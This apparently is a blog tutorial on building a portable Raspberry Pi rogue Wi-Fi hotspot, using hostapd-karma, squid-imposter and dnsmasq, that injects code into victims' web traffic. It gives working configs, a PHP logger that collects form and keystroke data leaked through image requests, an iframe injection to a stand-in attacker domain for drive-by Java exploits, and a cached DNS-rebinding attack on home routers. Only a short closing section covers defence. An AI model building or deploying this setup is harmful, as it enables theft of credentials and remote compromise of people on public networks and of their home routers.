This post will cover the implications of knowingly or unknowingly connecting to and using a 
hostile network without encrypted tunneling (ssl, vpn, etc).

First I will go over the platform details.
Then I'll go over how these attacks are performed and how far (bad) it can go.
Last, cover some ways of defending against these attacks.

The raspberry pi has been worked on to give it the ability to connect to the Internet and to produce it's own hot-spot. 
Also it has a power source making it truly portable.

The Raspberry Pi

The Hardware:
Anker pro battery 
TL-WN722N wireless adapter (compatible with hostapd) 
Rpi and generic case 
Android cell phone with data connection (Internet connection)

The Software

The image that is used does not matter as long as you can install the necessary packages, 
however I recommend choosing a Debian based image due to the use of apt.

Dnsmasq (our dns/dhcp/tftp-pxe server)
Apache2 
PHP5 & mod_php
Squid (web-caching proxy)
Hostapd (responsible for the AP)


Installing Dnsmasq is simple just use apt-get install dnsmasq. Just make sure the ip address for the 
wlan card is set to static in /etc/network/interfaces before dnsmasq runs otherwise it will fail subtly. 
There just need to be a modification in the /etc/default/dnsmasq file pointing to a /etc/dnsmasq.conf, 
also comment out were it points to /etc/dnsmasq.d.

 Example /etc/dnsmasq.conf

  interface=wlan0
  server=208.67.222.220 ## Opendns ip address (optional)
  dhcp-range=wlan0,10.0.0.100,10.0.0.150,255.255.255.0,12h
  no-resolv
  log-facility=/var/log/dnsmasq.log
  log-queries

For this dns server to work properly the interface in which it is going to listen which in this case is wlan0. 
So the interface needs to be up with a ip address that corresponds to the existing dhcp-range subnet. 
An working ip for the range in the above example config would be 10.0.0.1 /24

Installing apache and php5 is a lot simpler than it may seem at first since were going to use these 
services as the come out of the box using apt-get.

Installing Squid and Impostor will be the same as dnsmasq, although the configuration will be simpler since 
the squid script that is going to be used provides an optimized one. After squid is finished installing download 
squid-imposter from git hub using the git clone command and its available here . Follow the instructions included 
in the cloned directory as it includes the configuration file for squid.

For hostapd though your gonna need to itâ€™s sources as were going to need to apply a patch called karma, thus creating 
hostapd-karma. The instructions to do this is included in the read me file with the patch here, now a simple .conf 
file to get you on going.

 hostapd.conf

   interface=wlan0
   driver=nl80211
   ssid=Public-wifi
   channel=11       # variable to location
   auth_algs=3

The phone tethering is probably the simplest thing to do just make sure the pi is ON when you connect to the pi's 
usb as the phone won't detect it causing the usb tethering option to be grayed out. Also this may not work due to 
limitations imposed on your cell by your service provider. Once tethered all you have to do is check to see if your 
cell is now detected as an interface.

 My phone was detected as usb0

How it works

The manner this device will perform an attack is to appending code to a target web page being loaded by a clients 
web browser. As you can see this is not a simple point and click, but it does allow XSS attacks to be performed 
at will on the client side without having to compromise the server hosting the requested web page. This is still 
not without limitation as only machines connected to this LAN created by the Pi (acting as a router) are vulnerable.

Hostapd-Karma (optional)

What this patched version of hostapd does simply put is impersonate any open access point which it receives a probe 
request from a client. This make association to this access point transparent, also since mobile phones usually 
prefer using wifi for data if it's enabled also are susceptible to this. All theses attacks are pretty much 
transparent when using wifi near one of theses devices. This is optional though as one can just offer this hotspot 
as a public one (attwifi).

Squid-Imposter

This is essentially an squid html rewrite script with a lot of work put into it, the neat thing that it does 
besides just client-side code injection is it also leverages html5 caching meaning it requests the browser to cache 
the altered content pretty much making it persistent.

                                    
                                   Example scenarios

*Against laptops

Event sniffing with JavaScript injection. This can easily be done by appending a get element function then 
leaking the values as a get request for image tags to a php script hosted on the pi which logs the request. 
One can also append fields to forms to acquire additional information from a victim.

heres some crappy php code as an example: 

----php 
file_put_contents("/var/www/get.log",PHP_EOL . $_SERVER['QUERY_STRING'], FILE_APPEND);

sleep(1);
header('HTTP/1.0 204 No Content');
header('Content-Type: image/jpeg');

----php

The difficulty would still depend on the manner forms are processed by the web site

 
Remote access through social engineering or exploitation can be achieved by appending an iframe to a website 
hosting malicious code whether it be against Java or flash the goal of either will be the same, remote code execution. 
A simple way one can demonstrate this is using the setoolkit to generate a clone web page hosting a Java applet. 
It doesn't matter which as long as it is not one already defined as a target domain by squid-imposter. The computer 
which hosts this page can be then loaded on victims browsers automatically with an iframe.

 
  Example: super easy HTML injection

  content of target.append

      iframe src="http://some-ex-domain.biz" width="1" height="1" name="lolz"

<a><img class="size-large alignnone" src="../pics/drvbypi-injection-1.png" width="670" height="446" /></a>

<a><img class="size-large alignnone" src="../pics/drvbypi-injection-2.png" width="670" height="446" /></a>

<a><img class="size-large alignnone" src="../pics/drvbypi-injection-3.png" width="670" height="446" /></a>

*Against mobile devices

Social engineering attacks can be done with ease without having to have any working exploit against 
the target mobile OS. A simple example against android would be for one to inject a JavaScript prompt 
into a web page which input is then logged.

<a><img class="size-large alignnone" src="../pics/drvbypi-tablet.png" width="670" height="446" /></a>

Exploitation against web-kit and applications that use webview so it is possible to use existing exploits 
on older versions of android 4.1 for example would be vulnerable to the force installing of apks since 
one can auto load from a link on the clients behalf using JavaScript.

*Against residential routers

Iframe injection with html5 caching can make it possible to mount attacks against home/SOHO routers. 
An example of this would be a dns rebinding attack, which would require a web server hosting a web page with 
malicious JavaScript on the WAN. A demonstration of this could be performed using the PoC software called 
rebind located here. The iframe will be injected into the target domain and cached on the victims browser.

<a><img class="size-large alignnone" src="../pics/drvbypi-diagram.jpg" width="670" height="446" /></a>

Once the victim disconnects from the hostile network and connects to a trusted one, the one at home for example. 
Once the victim browses to the same web page that was cached by impostor the attack will execute against 
the then current gateway, the victims router. Giving an attacker access to the routers administration panel 
over the Internet. Giving them the ability to alter the DNS server used and or directing the router traffic 
to a malicious web application proxy. Using a device like this (Rpi) as a vector is not useful for 
mass exploitation but is very useful for specialized targeting.

 
Attack Overview

The raspberry pi is not the main attacking device it instead functions as a means of creating a greater 
attack surface (client-side web browser scripting) by exploiting the typical network routing structure.

 The functions performed by the rpi are not limited to just this one physical platform. Any device capable of 
routing and wireless access point creation with the used software packages can performed the same functions. 
Also hi power wlan cards in a mini-itx platform may be of more practical to use


Making yourself resilient

The simple fact one must realize in order to begin making effective decisions 
is that any unknown network is pretty much hostile.

<a><img class="size-large alignnone" src="../pics/drvbypi-hops.png" width="670" height="246" /></a>

For example in the image above, any one of these hops has the capability, witting or unwittingly of directing 
HTTP traffic to a web proxy like squid. 

This also is a warning against using random anonymous proxy's found on the Internet as they also can be used 
to inject evil code into your web pages. The only real solutions to this are awareness and the consistent use 
of encryption for example SSL and VPNs when on the road as this reduces the success of these attacks. 

Also the use of SSL is important when using tor as it helps prevent any sniffing of the traffic going out 
an exit node.
